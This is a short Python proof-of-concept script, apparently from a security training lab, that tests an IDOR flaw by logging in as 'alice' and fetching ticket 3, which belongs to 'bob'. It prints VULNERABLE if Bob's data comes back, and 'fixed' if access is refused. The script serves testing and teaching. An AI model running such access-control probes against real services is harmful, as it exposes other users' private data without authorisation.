"""F01 IDOR: a logged-in user reads another user's ticket by changing the id.

Expected (vuln): alice reads ticket 3 (Bob's) -> HTTP 200 with Bob's data.
Expected (fixed): HTTP 403.
"""

from lab import auth_header, banner, client, login


def run():
    banner("IDOR on GET /api/tickets/{id}")
    c = client()
    tok = login(c, "alice", "alice-pw")["token"]
    r = c.get("/api/tickets/3", headers=auth_header(tok))  # ticket 3 belongs to bob
    print(f"GET /api/tickets/3 as alice -> {r.status_code} {r.text}")
    return r.status_code == 200 and "Bob" in r.text


if __name__ == "__main__":
    print("VULNERABLE" if run() else "not exploitable (fixed)")
